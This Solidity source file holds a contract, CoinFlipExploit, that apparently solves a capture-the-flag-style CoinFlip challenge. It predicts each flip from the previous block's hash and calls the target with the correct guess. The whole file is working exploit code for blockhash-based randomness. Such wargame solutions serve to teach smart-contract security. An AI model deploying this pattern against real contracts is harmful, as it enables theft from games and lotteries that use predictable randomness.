// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface CoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {
    CoinFlip public coinflip;

    constructor(CoinFlip _coinflip) {
        coinflip = _coinflip;
    }

    function exploit() external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        assembly {
            mstore(0, "flip(bool)")
            mstore(0, keccak256(0, 10))

            let blockValue := blockhash(sub(number(), 1))
            let guess := div(blockValue, FACTOR)
            mstore(4, guess)

            let success := call(gas(), sload(coinflip.slot), 0, 0, 0x24, 0, 0x20)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
